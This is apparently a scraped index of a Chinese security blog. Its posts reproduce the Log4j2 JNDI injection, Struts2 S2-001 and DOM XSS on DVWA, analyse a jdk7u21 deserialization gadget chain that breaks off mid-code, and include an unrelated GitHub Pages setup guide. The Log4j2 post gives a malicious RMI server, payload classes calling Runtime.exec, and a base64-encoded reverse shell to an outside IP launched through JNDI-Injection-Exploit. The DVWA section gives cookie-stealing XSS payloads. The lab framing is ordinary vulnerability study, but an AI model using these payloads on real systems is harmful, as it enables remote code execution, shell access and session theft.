} } }运行结果， 上面说了 log4j2 会把 ${} 包裹内容进行单独处理，利用 lookup 功能进行查找。Log4j2 内置了多个 Lookup 实现，每个 Lookup 都有不同的用途和功能。以下是一些常见的 Lookup 类型： ${date}：获取当前日期和时间，支持自定义格式。 ${pid}：获取当前进程的 ID。 ${logLevel}：获取当前日志记录的级别。 ${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。 ${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。 ${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。 ${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。 ${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。 这里把上面的 admin 替换为 ${sys:user.dir}，再次运行， 而造成漏洞是因为这里的 lookup 它是基于 jndi 的，而 jndi 里面我们早在之前说过直接调用 lookup() 是会存在漏洞的。 ","date":"2025-02-09","objectID":"/posts/log4j2/:4:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞复现 自己编写一个 RMIServer， package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMI_Server { void register() throws Exception{ LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"RMI_POC\",\"RMI_POC\",\"http://ip:6666/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\"hello\",refObjWrapper); System.out.println(\"START RUN\"); } public static void main(String[] args) throws Exception { new RMI_Server().register(); } }搭建好恶意的 RMI 服务器，并且在远端服务器上放置恶意类，RMI_POC.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.Hashtable; public class RMIHello extends UnicastRemoteObject implements ObjectFactory { public RMIHello() throws RemoteException { super(); try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }编译为 class 字节码，然后启动 http 监听， payload：${jndi:rmi://localhost:1099/hello}，最后成功执行， 然后再在 vulhub 靶场复现一次，搭建好靶场后访问 8983 端口，传入下面 payload 验证漏洞 /solr/admin/cores?action=${jndi:ldap://620de897.log.dnslog.sbs.} dns 收到请求， 这里打 Ladp，因为是本地搭建的靶场，所以本地搭建 LdapServer 服务，然后在远程端进行 http 监听，远程端的恶意利用类改为反弹 shell 的命令， import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class LDAP_POC implements ObjectFactory { public LDAP_POC() throws Exception{ try { Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }传入 payload， ${jndi:ldap://ip:9999/LDAP_POC}成功反弹 shell 尝试利用工具来进行攻击，工具下载地址：https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0，然后构建命令进行监听， java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\" -A \"47.109.156.81\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i} 就是 exec 里面执行的命令，-A 参数是攻击机 ip， 然后根据 jdk 版本选择 payload 传入，这个 jdk 版本可以通过命令 ${jndi:rmi://${sys:java.version}.vbdpkn.ceye.io} 进行 dns 外带查看，这里选择 jdk1.8 版本的， ${jndi:ldap://47.109.156.81:1389/nvxwvy}最后也能成功反弹 shell ","date":"2025-02-09","objectID":"/posts/log4j2/:5:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞分析 来到 PatternLayout#toSerializable 方法，对 formatters 进行循环处理， 在循环到第七次时，跟进到 format 方法，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走。会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在${，那么就会取出从 $ 开始知道最后的字符串，这一步 最后得到 value 为， 继续跟进 replace() 方法，replace() 方法里面调用了 substitute() 方法，这里就是将 ${} 中间的内容取出来，然后又会调用 this.subtitute 来处理。最后调用到 resolveVariable 方法， resolver解析时支持的关键词有[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]，而我们这里利用的jndi:xxx后续就会用到JndiLookup这个解析器 这个 lookup() 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 rmi 服务的时候，是调用原生的 lookup() 方法的，是存在漏洞的。 最后成功执行。 ","date":"2025-02-09","objectID":"/posts/log4j2/:6:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞修复 更新log4j至 rc2 配置防火墙策略，禁止主动连接外网设备 升级受影响的应用及组件 过滤相关的关键词，比如${jndi://*} 限制JNDI默认可以使用的协议 限制可以通过LDAP访问的服务器和类 参考：https://www.freebuf.com/articles/web/341857.html 参考：https://www.freebuf.com/articles/web/380568.html ","date":"2025-02-09","objectID":"/posts/log4j2/:7:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":null,"content":"Github Pages博客搭建教程 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:0:0","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Github Pages+ Hexo 搭建个人博客 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:0","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"一、下载 Git git是一个包管理工具，在linux是自带的，windows上需要下载。 参考：https://www.cnblogs.com/xueweisuoyong/p/11914045.html ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:1","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"二、下载 Node.js \u0026 npm 下载参考：https://blog.csdn.net/weixin_38610651/article/details/108721957 Node.js 默认配置了 npm，因此不需要额外下载，可以根据需要配置 npm下载路径。 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:2","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"三、安装 Hexo 执行命令 npm install hexo-cli -g执行 hexo -version 查看是否安装成功， ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:3","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"四、本地预览 新建一个用于存储博客数据的目录(如 D:\\hexo-blog)并确保该目录为空，随后在终端中执行， hexo init （文件名）（可选，默认本文件夹）等待一段时间，即可成功初始化。此时可使用 hexo s -g 本地预览初始化成功的博客 g是部署，s是本地启动本地预览效果如下： ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:4","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"五、部署到 Github 上 详细看参考：https://blog.csdn.net/yaorongke/article/details/119089190 访问地址效果： ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:5","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"六、主题配置 这里选择下载主题 butterfly， 跟多主题详细配置参考：butterfly主题配置 主题魔改参考：butterfly主题魔改 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:6","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Github Pages+ Hugo 搭建个人博客 参考：https://www.shaohanyun.top/posts/env/blog_build2/ 参考：https://github.com/lazeroffmichael/example-hugo-blog 参考：https://lianpf.github.io/posts/other/tools-docs-hugo-papermod/ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:0","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"一、主题配置 把之前的 gaorenyusi.github.io 仓库清空，然后下载 hugo，执行下面命令生成网站主文件 hugo new site blog hugo new site blog --format yaml然后下载主题（这里用的是LoveIt主题，但还是可以参考上面链接） cd blog git clone https://github.com/dillonzq/LoveIt.git themes/LoveIt可以把 exampleSite 目录中的配置文件 hugo.toml 复制到主文件，然后根据需要修改 hugo.toml 我的配置文件： hugo.toml. 最后执行下面命令进行本地预览 hugo server -D-D 是生成 public 目录，然后访问地址 http://localhost:1313 进行本地访问， 更多主题配置: LoveIt主题配置 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:1","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"二、部署到 github pages 在 public 目录下执行下面命令即可， git init git add . git commit -m \"first commit\" git branch -M main git remote add origin 仓库地址 git push -u origin main -f","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:2","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"三、Action 自动提交博客 什么是Github Action?\rGithub Action 是 Github 提供的 CI 系统，可以让用户编写脚本，并在触发指定的操作后（比如新 commit push 到仓库），自动触发脚本。它可以： 编译项目 测试项目 登陆远程服务器 发布服务 等等…… 具体配置参考：https://ratmomo.github.io/p/2024/06/%E4%BD%BF%E7%94%A8-hugo–github-pages-%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/#%E7%95%AA%E5%A4%96%E7%AF%87%E4%BD%BF%E7%94%A8github-action%E8%87%AA%E5%8A%A8%E5%8F%91%E5%B8%83%E5%8D%9A%E5%AE%A2 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:3","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":["javasec"],"content":"S2-001 ","date":"2025-01-22","objectID":"/posts/s1-001/:0:0","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"漏洞介绍 Struts2对OGNL表达式解析使用了开源组件 opensymphony.xwork 组件，OGNL解析代码实际上位于XWork中，而不是 WebWork2 或Struts2 中 该漏洞是由于WebWork 2.1+ 和 Struts 2 的\"altSyntax\"特性引起的。altSyntax特性允许将OGNL表达式插入文本字符串并进行递归处理。这允许恶意用户通过HTML文本字段提交一个包含OGNL表达式的字符串，如果表单验证失败，服务器将执行该表达式。 ","date":"2025-01-22","objectID":"/posts/s1-001/:1:0","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"影响版本 WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8 ","date":"2025-01-22","objectID":"/posts/s1-001/:2:0","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"环境搭建 这里学习 nivia 师傅的环境搭建方法，下载 vulhub 靶场，然后参考 war 包运行：Tomcat 服务搭建， 但是这个教程只是能运行 war 包，还不能调试，如果直接搜索调试的话是类似 IDEA 调试 jar 包这个这种调试，没什么用，这里可以直接把解压后的文件配置依次复制过来，然后选择部署 facet，这样就行了。 还可以直接配置远程调试。 ","date":"2025-01-22","objectID":"/posts/s1-001/:3:0","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"漏洞复现 访问漏洞环境， POST：username=%{1+1}\u0026password=1 ","date":"2025-01-22","objectID":"/posts/s1-001/:4:0","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"漏洞分析 调用栈， 在相应的漏洞版本下，核心Filter为org.apache.struts2.dispatcher.FilterDispatcher，从web.xml中也可以看出 ","date":"2025-01-22","objectID":"/posts/s1-001/:5:0","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"将 Action 类的相关属性放到 ValueStack 那么在 org.apache.struts2.dispatcher.FilterDispatcher#dofilter 处下断点，先获得 Actionmapping， 然后 mapping 不为 null，调用 dispatcher#serviceAction 方法， 该方法始化extraContext，封装了session、HttpServletRequest、HttpServletResponse等信息。获取ValueStack，调试时为null。 初始化ActionProxy。proxy.getInvocation().getStack() 初始化 ValueStack，通过 setAttribute 方法封装进 request， 调用 ActionProxy#execute，这里对应会调用到 ActionInvocation#invoke，这里开始执行拦截器 ","date":"2025-01-22","objectID":"/posts/s1-001/:5:1","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"调用拦截链的拦截器 其中到 ParametersInterceptor 拦截器时跟进 doIntercept 方法，是获取对应Action，获取ActionInvocation和parameters，parameters对应请求中的参数。由于parameters不为null，这里会获取StackValue，调用setParameters方法 在 ParametersInterceptor#setParameters 方法中，会遍历这个 parameters，将键值对存进Stack中，对应 OgnlValueStack#setValue 方法，这个过滤器就是单纯存个参数值，（这里也可以注意一下就是后面的 s2-003 漏洞） 然后调用到 DefaultWorkflowInterceptor#doIntercept 方法，在这个方法最后调用了ActionInvocation#invoke ","date":"2025-01-22","objectID":"/posts/s1-001/:5:2","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"调用完所有拦截器后调用 Action 方法 跟进然后一路调用到了 invokeActionOnly() 方法，这里开始调用对应Action#execute方法了， 来到了 LoginAction#execute，也就是自己写的逻辑，这里会执行失败返回 error ","date":"2025-01-22","objectID":"/posts/s1-001/:5:3","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["javasec"],"content":"表单执行失败处理 看到 struts.xml 配置中如果返回 error 就会回到 index.jsp 页面 返回结果以后就开始调用 ActionInvocation#executeResult 方法，调用Result实现类里的execute方法开始处理请求结果， 然后一路调用，处理结果 如果返回结果是一个 jsp 文件，则会调用 JspServlet 来处理请求，调用栈如下（用一下nivia师傅的图） 最后交由 Struts 来处理解析相关的标签， 例如在解析Struts标签如\u003cs:textfield name=\"username\" label=\"username\" /\u003e，在标签的开始和结束位置，会分别调用对应实现类中的doStartTag和doEndTag方法： doStartTag：获取一些组件信息和属性赋值，总之是些初始化的工作 doEndTag：在标签解析结束后需要做的事，如调用组件的end 这里会调用到ComponentTagSupport这个实现类，漏洞触发点位于ComponentTagSupport#doEndTag 当解析 \u003cs:textfield name=\"username\" label=\"username\" /\u003e，doEndTag 方法会getBean方法获取到TextField对象赋值给 component，调用其end方法 跟进 evaluateParams 方法，判断是否开启altSyntax，若开启会套上一层%{} 跟进 findValue 方法，满足条件调用 TextParseUtil.translateVariables 方法 public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) { Object result = expression; while (true) { int start = expression.indexOf(open + \"{\"); int length = expression.length(); int x = start + 2; int end; char c; int count = 1; while (start != -1 \u0026\u0026 x \u003c length \u0026\u0026 count != 0) { c = expression.charAt(x++); if (c == '{') { count++; } else if (c == '}') { count--; } } end = x - 1; if ((start != -1) \u0026\u0026 (end != -1) \u0026\u0026 (count == 0)) { String var = expression.substring(start + 2, end); Object o = stack.findValue(var, asType); if (evaluator != null) { o = evaluator.evaluate(o); } String left = expression.substring(0, start); String right = expression.substring(end + 1); if (o != null) { if (TextUtils.stringSet(left)) { result = left + o; } else { result = o; } if (TextUtils.stringSet(right)) { result = result + right; } expression = left + o + right; } else { result = left + right; expression = left + right; } } else { break; } } return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType); }方法使用while true的方式递归执行ognl表达式，执行逻辑位于 Object o = stack.findValue(var, asType);，解析过后将解析结果替换回原来的表达式中，继续第一步，直到不出现 %{}， 比如第一次 %{username}， 解析得到， 然后回替换回原来表达式，因为还有 %{}，所以会继续解析，造成二次解析，再次调用 stack.findValue(var, asType) 方法， 最后执行命令。 ","date":"2025-01-22","objectID":"/posts/s1-001/:5:4","tags":["java","struts2"],"title":"S2-001","uri":"/posts/s1-001/"},{"categories":["漏洞学习"],"content":"DOM型XSS学习 Ps：之前一直没好好学过 xss，特别是 dom 型 xss 快忘得差不多了，所以今天抽空简单补补，也不是学得很深入。 ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:0:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["漏洞学习"],"content":"DOM 型 XSS 是什么 DOM型XSS是基于DOM文档对象模型的一种漏洞，DOM 型 XSS 并不会和后台进行交互。由客户端的脚本程序通过DOM动态地检查和修改页面内容，从客户端获得DOM中的数据（如从URL中获取数据）并在本地进行执行。 常见的危险危险函数如： document.URL，document.write，location，window.location。 如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互： \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eDOM XSS\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript\u003e var pos=document.URL.indexOf(\"name=\")+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length))); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003edocument.URL 获取用户输入，代码中未经过任何过滤就传递给了 document.write 输出到当前页面中。那么传入 name=\u003cscript\u003ealert (111)\u003c/script\u003e 就可以触发 xss 漏洞 是不是感觉很像反射型 xss，只是不同的是这里不会后端进行交互，可以看到 dom 中已经插入了我们的元素， 但是查看源码是没有的。 ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:1:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["漏洞学习"],"content":"常见的危险函数 下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。 Sources document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname Sinks 直接执行脚本类 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) 写HTML页面类 document.write(…) document.writeln(…) element.innerHTML(…) 直接修改DOM类 document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) 替换文档URL类 document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) 打开/修改窗口类 document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname) 当然，除此之外，还有比较细节的特性这里就不列举了，可自行研究。 相关例子参考：http://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/ ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:2:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["漏洞学习"],"content":"DVWA 的 DOM 型 XSS 开题： 难度：一、简单 由于是 dom 型 xss 直接查看其元素。 看到先是获取参数 defalut 的值然后把其写入 \u003coptinon\u003e 标签中，然后查看源码发现没有任何过滤 \u003c?php # No protections, anything goes ?\u003e 所以传参?default=\u003cscript\u003ealert(\"aaa\")\u003c/script\u003e 执行 发现元素已经成功插入 难度：二、中等 原理是一样的，就是多做了些过滤，查看源码 \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"\u003cscript\") !== false) { header (\"location: ?default=English\"); exit; } } ?\u003e 意思就是我们输入的参数值中不能有 \u003cscript 标签，那么还可以用其它的标签 HTML 的 \u003c img \u003e 标签定义 HTML 页面中的图像，该标签支持 onerror 事件，在装载文档或图像的过程中如果发生了错误就会触发。使用这些内容构造出 payload 如下，因为我们没有图片可供载入，因此会出错从而触发 onerror 事件输出 cookie。所以构造： ?default=English\u003c/option\u003e\u003c/select\u003e\u003cimg src = 1 onerror = alert(document.cookie)\u003e或者 \u003e\u003c/option\u003e\u003c/select\u003e\u003ciframe onload=alert(/xss/)\u003e难度：三、困难 源码： \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?\u003e 发现是个白名单，只允许输入指定的参数，其他的都会跳转为 ?default=English 但这里没过滤 \u003cscript\u003e 标签。 简单构造： English #\u003cscript\u003ealert(document.cookie)\u003c/script\u003e","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:3:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["javasec"],"content":"jdk7u21 链子分析 java 中的反序列化大部分时候都依靠第三方组件漏洞，原生链子很少，今天分析其中条：jdk7u21 ","date":"2024-10-20","objectID":"/posts/jdk7u21/:0:0","tags":["java","反序列化"],"title":"jdk7u21 链子分析","uri":"/posts/jdk7u21/"},{"categories":["javasec"],"content":"链子分析 环境：Java7u21原生链反序列化要求jdk版本低于7u21，其他的什么第三方依赖都不需要。下载 jdk 源码地址：https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/f3cf02a53684 ysoserial 中给出的调用链， Gadget LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.\u003cclinit\u003e() ... Runtime.exec()这里实际调用的链子。 HashSet.readObject() map.put Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass()关键方法 AnnotationInvocationHandler.equalsImpl() ，看到在 else 存在反射调用， memberMethod 是循环调用 getMemberMethods 方法获取的，跟进到 getMemberMethods，最后返回的其实就是 type 中所有方法组成的数组，然后进行循环调用。type 在该类构造函数中赋值，可控。 回到 equalsImpl() 方法中，要进入 for 循环还需要满足一个条件， if (!type.isInstance(o)) return false;type 需要是 o 的实例化，这里最后选择的是 templates 类，那么 type 和 o 就都是 templates 类了。上面利用 getDeclaredMethods() 获得所有方法，其中就包括 getOutputproperties() 方法，最后执行 memberMethod.invoke(o) 调用该方法进行动态加载字节码（其中 memberMethod.invoke(o)是只能调用无参方法）。 继续向上面看，o 就是调用的 equalsImpl 方法参数，即让 equalsImpl 方法参数也为 templates 类就行了。 然后在 AnnotationInvocationHandler.invoke() 中调用了 AnnotationInvocationHandler.equalsImpl() 方法，不过需要满足 if 条件，要求反射调用的方法是 equals，并且该方法只有一个参数，参数类型是 object.class。 那么怎么去触发该 invoke 方法了，这里的类名结尾是 handler，可以通过动态代理进行触发， 看上面的链子不难发现用的是 LinkedHashSet 类，在 hashset#readobject 方法中调用了 map.put 方法，cc7 中已经知道 hashmap.put 中会触发 equal 方法 跟进到其 put 方法中，需要满足 map 中的两对键值 hashcode 相同，然后让 key 为代理类对象，在调用 equals 方法是就可以触发到 AnnotationInvocationHandler.invoke() 方法，这里还需要参数 k 为 templates 对象就能进行触发 invoke 方法， 先来满足 Proxy 的 hashCode 的 TemplatesImpl 的 hashCode 相等。调用 TemplatesImpl.hashCode 就是 object 中的 hashcode，而 Proxy 的 hashcode 会调用到 AnnotationInvocationHandler 中的 hashCodeImpl 方法， Annotationinvocationhandler 的构造方法会对 memberValues 进行赋值。然后 for 循环又会对map中的每个key和 value 进行异或求和。现在我们可以控制 memberValues，也就可以决定 Proxy.hashcode 返回的值， 于是如果我们可以构造的一个map 满足，key的hashCode()结果是0，value是templateslmpl对象。那么最后返回的 hashcode 就和 TemplatesImpl.hashCode 相等了，这个 key 可以参考 p 神的爆破脚本 public class Text { public static void main(String[] args) { for (long i = 0; i \u003c 9999999999L; i++) { if (Long.toHexString(i).hashCode() == 0) { System.out.println(Long.toHexString(i)); } } } }在 ysoserial 给的是 f5a5a608 ","date":"2024-10-20","objectID":"/posts/jdk7u21/:1:0","tags":["java","反序列化"],"title":"jdk7u21 链子分析","uri":"/posts/jdk7u21/"},{"categories":["javasec"],"content":"poc 构造 实列化 AnnotationInvocationHandler 类，让 type 为 Templates.class ，hashmap 键值为特意构造计算相同的 hash 值 TemplatesImpl tem = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/poc.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); HashMap hashMap = new HashMap(); hashMap.put(\"f5a5a608\",tem); Class clz=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor c = clz.getDeclaredConstructor(Class.class, Map.class); c.setAccessible(true); InvocationHandler handler = (InvocationHandler) c.newInstance(Templates.class, hashMap);然后把值添加进 hashset 中，poc： package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.Templates; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class jdk7u21 { public static void main(String[] args)throws Exception { TemplatesImpl tem = new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/poc.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); HashMap hashMap = new HashMap(); hashMap.put(\"f5a5a608\",tem); Class clz=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor c = 